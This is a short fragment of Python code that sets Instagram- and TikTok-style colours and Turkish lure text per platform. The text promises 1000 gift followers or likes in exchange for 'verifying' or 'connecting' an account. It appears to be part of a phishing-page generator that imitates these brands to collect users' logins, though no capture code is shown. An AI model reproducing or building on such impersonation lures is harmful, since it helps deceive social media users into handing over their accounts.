        bg_color, accent, btn_color = "#ffffff", "#E1306C", "#0095F6"
        title, desc = "Instagram Takipçi Paneli", "Hediye 1000 takipçiyi almak için profilinizi onaylayın."
    elif platform == "TikTok":
        bg_color, accent, btn_color = "#ffffff", "#EE1D52", "#fe2c55"
        title, desc = "TikTok Beğeni & İzlenme", "Keşfet etkili paketi tanımlamak için hesabınızı bağlayın."
